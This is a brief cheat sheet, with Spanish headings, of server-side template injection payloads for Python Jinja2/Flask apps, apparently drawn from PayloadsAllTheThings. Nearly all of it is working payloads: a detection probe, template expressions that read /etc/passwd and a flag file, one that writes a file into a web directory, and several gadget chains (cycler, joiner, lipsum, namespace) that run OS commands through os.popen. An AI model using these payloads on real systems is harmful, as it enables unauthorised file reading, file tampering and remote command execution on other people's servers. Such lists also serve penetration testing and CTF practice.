
#### RECURSO
```url
https://swisskyrepo.github.io/PayloadsAllTheThings/Server%20Side%20Template%20Injection/Python/
```

### PRUEBA SI ES VULNERABLE
```shell
{{8*8}}
```

#### RFI
```shell
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}[](https://swisskyrepo.github.io/PayloadsAllTheThings/Server%20Side%20Template%20Injection/Python/#__codelineno-12-3)


{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]("/tmp/flag").read() }}[](https://swisskyrepo.github.io/PayloadsAllTheThings/Server%20Side%20Template%20Injection/Python/#__codelineno-12-4)


{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}
```

### ESCRIBIR EN ARCHIVOS
```shell
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/var/www/html/myflaskapp/hello.txt', 'w').write('Hello here !') }}
```


### EJECUCIÓN DE COMANDOS
```SHELL
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}

{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }}
{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read() }}

{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ joiner.__init__.__globals__.os.popen('id').read() }}
{{ namespace.__init__.__globals__.os.popen('id').read() }}

{{ lipsum.__globals__["os"].popen('id').read() }}
```




